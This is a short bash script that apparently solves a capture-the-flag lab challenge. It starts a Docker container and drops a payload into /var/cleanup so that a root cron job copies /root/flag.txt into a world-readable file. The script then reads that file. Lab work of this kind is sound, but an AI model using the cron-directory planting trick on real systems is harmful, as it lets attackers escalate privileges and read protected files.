#!/usr/bin/env bash
set -euo pipefail

IMAGE="challenge9:latest"
CONTAINER="challenge9"

# Check if container exists
if ! docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER}$"; then
    echo "[i] Container does not exist. Starting a new one..."
    docker run -d --name "$CONTAINER" "$IMAGE"
else
    # Container exists — check if it's running
    STATUS=$(docker inspect -f '{{.State.Status}}' "$CONTAINER")
    if [ "$STATUS" != "running" ]; then
        echo "[i] Container exists but is not running. Starting it..."
        docker start "$CONTAINER" >/dev/null
    else
        echo "[i] Container is already running."
    fi
fi

# Payload to grab the flag
read -r -d '' PAYLOAD <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
cat /root/flag.txt > /tmp/flag.out
chmod 644 /tmp/flag.out
EOF

# Copy payload into container
tmpfile="$(mktemp)"
echo "$PAYLOAD" > "$tmpfile"
chmod +x "$tmpfile"
docker cp "$tmpfile" "$CONTAINER":/var/cleanup/grabflag.sh
rm -f "$tmpfile"

# Wait for cron to execute (up to ~90 seconds)
echo "[i] Waiting for cron to run payload..."
for i in $(seq 1 18); do
    if docker exec "$CONTAINER" test -f /tmp/flag.out; then
        break
    fi
    sleep 5
done

# Show the flag
docker exec "$CONTAINER" cat /tmp/flag.out
